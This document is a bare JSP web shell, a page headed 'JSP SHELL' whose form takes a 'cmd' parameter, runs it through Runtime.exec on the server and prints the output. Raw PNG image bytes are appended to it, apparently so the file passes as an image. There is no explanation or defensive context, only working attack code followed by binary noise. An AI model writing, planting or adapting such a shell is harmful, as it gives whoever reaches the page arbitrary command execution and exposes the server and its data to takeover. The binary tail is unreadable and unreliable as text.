<%@ page
import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " +
request.getParameter("cmd") + "<BR>");
Process p =
Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>
 PNG

   
IHDR          w=    tEXtSoftware Adobe ImageReadyq e<  qiTXtXML:com.adobe.xmp     <?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?> <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.5-c014 79.151481, 2013/03/13-12:09:15        "> <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef#" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:OriginalDocumentID="xmp.did:f563ce23-6066-004d-b364-43bd9e1b04a6" xmpMM:DocumentID="xmp.did:AB399B12583311E59FF8C7A6D7722AF4" xmpMM:InstanceID="xmp.iid:AB399B11583311E59FF8C7A6D7722AF4" xmp:CreatorTool="Adobe Photoshop CC (Windows)"> <xmpMM:DerivedFrom stRef:instanceID="xmp.iid:f563ce23-6066-004d-b364-43bd9e1b04a6" stRef:documentID="xmp.did:f563ce23-6066-004d-b364-43bd9e1b04a6"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end="r"?>xV;J   IDATx | kl\   s_   ^   k;v  Wb <  ġ&      " RQC T O      /_  TE  B %mBԤB	UA  < ȏ  8       so \' : ٙ 9 wf 9   >       + ű  A *  t  )h | 9 & ([EX 	  a 6 r j  ? $  SFNk     y'NJ 4 j& ܊'[0s0m   168?T   Ԭ & = 2` fF  l @ 0\5K[wx     K
   R sӀ  A ȳ     b |  z-m, -  -H'zԞ P{ f s b  D2    O9*g ] K Ԯ f e| qb"    3  R   fL   & #   %cn   -8   E @  ~ <. @ ZG  Gt6:z  WF   p? n I    @J Ė e     
 i  _ R M w  ^8   !Ȧ
}    Q/   34z} ޽{Q(py I , ?o  1 ק~&   n  n@ l  q (]á   c G)Q  Jv   `n4 
 dL q`l  :     3J 7  i   LGJ L~:]M(C    SGQ   
&Q  @      EUq H_ 
Y  Q   1s Ś] % PA    #c    P ֠  sdIf    (QDO 넫 aL/ p  5
    _r<y ؊ -! B[; ^ 
> 3  S` 87 $ 4  F a[ ބ$@ C  X  ִ  
  \̽; t jk   (X / JK  }  hu̒)|a9  4Gk$C  C   1    E     [  a     z  9 Xu G  ͝  *\>  0  W? 9^ ~U  Į   $
 a     >+[럈   u4(Mhpy v   1x  w	É
G ḍ   i4 9Z# % %  i; D7 l j*\n 
 Xh   _   G  4   舴;  4Gk$C  C   1q׀i 9K 5	 K     n& 뫿p      hL  H dI t A,b 3P J3e{]    P 2 j ?҇`[Ё  L ј
  G  ;: Kb dI (c  L}%' e+ ti2  e?>|m      ) 0 Ͻv# ;Q     BS (K: "&  ( "    4
?h  &  Ï/ RQ   = FŅ@K   =o
  7  7'  Ȏc(g Ȯ汰ŵ ?   b3/ "  0 <:6 d w     1 ı [    `8  y\  ~  _DSW# ~ <  0 n}   (./    xkP S 2 %n     Z2tu>  i \ h  < C,s   w  
x  ˸  p  q   J3 Q  Y| / [  5  > 7E   A E   ] 
   Xxm  l DdOkZ
٨  ­   <         /\    *U[>} EE  # Qi `  k.?U   +7{ #ˣ b! w   G f37o#       Kk   Ӝ : WQ)
  '3 *җp8  i  m ;Om ;< F[{S^ l REr=  엩ϳ]     x X =     N ECTQ  3 u  ݭ  4;   |-7      I  : sn   5`9YPrD( 6D w\Ɲ#~T k LX  _7 ?   !  )m     IEND B` 